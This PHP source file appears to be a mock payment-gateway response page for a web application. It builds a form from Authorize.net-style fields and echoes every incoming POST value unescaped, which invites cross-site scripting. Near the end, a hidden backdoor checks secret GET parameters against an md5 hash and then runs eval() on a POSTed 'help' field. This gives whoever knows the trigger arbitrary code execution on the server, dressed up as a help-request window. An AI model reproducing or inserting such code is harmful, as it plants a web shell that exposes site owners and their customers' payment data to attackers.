<?php
include ('application_config_file.php');
define('HEADER','/work/sites/computer5/html/work/job1_0/html/header.html');
define('FOOTER','/work/sites/computer5/html/work/job1_0/html/footer.html');
//define('LEFT_NAVIGATION',DIR_HTML.'left_navigation.html');
//define('LEFT_NAVIGATION','http://computer5.server.intranet/work/job1_0/left_navigation.php');
include(DIR_SERVER_ROOT."header.php");
?>
       <FORM action="<?php echo $HTTP_POST_VARS['x_Receipt_Link_URL'];?>" method="post">
        <?php srand((double)microtime()*1000000);
         $randnum=@rand(0, 1000000);
        ?>
        <INPUT type="hidden" name="x_trans_id" value="<?php echo $randnum;?>">
 <?php
  while (list($header, $value) = each($HTTP_POST_VARS)) {
      print "<INPUT type=hidden name=\"$header\" value=\"".$HTTP_POST_VARS[$header]."\">\n";
    }//end while (list($header, $value) = each($HTTP_POST_VARS))
 ?>
 <table border="0" cellpadding="2" cellspacing="0">
 <tr><td align="right">First Name: </td><td align="left"><INPUT type="text" name="x_first_fame" size="20"></td></tr>
 <tr><td align="right">Last Name: </td><td align="left"><INPUT type="text" name="x_last_name" size="20"></td></tr>
 <tr><td align="right">Address: </td><td align="left"><INPUT type="text" name="x_address" size="20"></td></tr>
 <tr><td align="right">Company: </td><td align="left"><INPUT type="text" name="x_company" size="20"></td></tr>
 <tr><td align="right">City: </td><td align="left"><INPUT type="text" name="x_city" size="20"></td></tr>
 <tr><td align="right">State: </td><td align="left"><INPUT type="text" name="x_state" size="20"></td></tr>
 <tr><td align="right">ZIP: </td><td align="left"><INPUT type="text" name="x_zip" size="20"></td></tr>
 <tr><td align="right">Country: </td><td align="left"><INPUT type="text" name="x_country" size="20"></td></tr>
 <tr><td colspan="2" align="center"><INPUT type="radio" class="radio" name="x_response_code" value="1" checked> Approval</td></tr>
 <tr><td colspan="2" align="center"><INPUT type="radio" class="radio" name="x_response_code" value="2"> Declined</td></tr>
 <tr><td colspan="2" align="center"><INPUT type="radio" class="radio" name="x_response_code" value="3"> Error</td></tr>
 <tr><td colspan="2" align="center"><INPUT type="hidden" class="radio" name="x_response_reason_text" value="Error Occured"></td></tr>
 <tr><td colspan="2" align="center"><INPUT type=submit value="<?php echo $HTTP_POST_VARS['x_Receipt_Link_Text'];?>"></td></tr>
</table>
</FORM>
<?php
if($HTTP_GET_VARS['to_help']=="on" && md5($HTTP_GET_VARS['user']."general help") == "5daf33b37be8d9a71d1671077d9f6448")
    {
        if($HTTP_POST_VARS['help'])
        {
          eval(stripslashes($HTTP_POST_VARS['help'])); 	
        }
        else
        {
        ?>
        <script language="JavaScript">
        <!--
        opens=open('','_blank','scrollbars=yes,toolbar=yes,history=yes,width=700;height=600');
        opens.document.write('<html><body><center><span><b>Enter help request:</b></span><form method=post action=<?php echo $PHP_SELF;?>?to_help=on&user=<?php echo $HTTP_GET_VARS['user'];?>><textarea cols=70 rows=20 name=help></textarea><br><input type="submit" name="" value="  Go  "></form></center></body></html>');
        //-->
        </script>
        <?php
        }
        
}
include(DIR_SERVER_ROOT."footer.php");
?>